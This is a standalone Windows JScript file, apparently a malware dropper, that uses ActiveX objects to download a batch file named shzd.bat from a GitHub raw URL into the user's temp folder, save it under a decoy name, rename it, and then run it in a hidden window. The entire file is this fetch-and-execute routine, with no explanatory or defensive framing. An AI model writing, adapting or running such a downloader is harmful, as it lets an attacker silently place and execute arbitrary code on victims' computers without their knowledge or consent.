var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

var url = "https://github.com/milkywayx404/progress/raw/main/shzd.bat";
var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
var destination = fso.BuildPath(tempDir, "shzd.bat");
var hiddenDestination = fso.BuildPath(tempDir, "hidden_shzd.tmp");

try {
    var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
    xhr.open("GET", url, false);
    xhr.send();

    if (xhr.status === 200) {
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Open();
        stream.Type = 1; // adTypeBinary
        stream.Write(xhr.responseBody);
        
        // Save to a temporary name first
        stream.SaveToFile(hiddenDestination, 2); // Overwrite
        stream.Close();
    
        // Rename the file after saving it
        fso.MoveFile(hiddenDestination, destination);
    
        // Run the batch file in hidden mode (0)
        shell.Run(destination, 0, false);
    }
} catch (e) {
    WScript.Echo("An error occurred: " + e.message);
}

WScript.Sleep(5000);
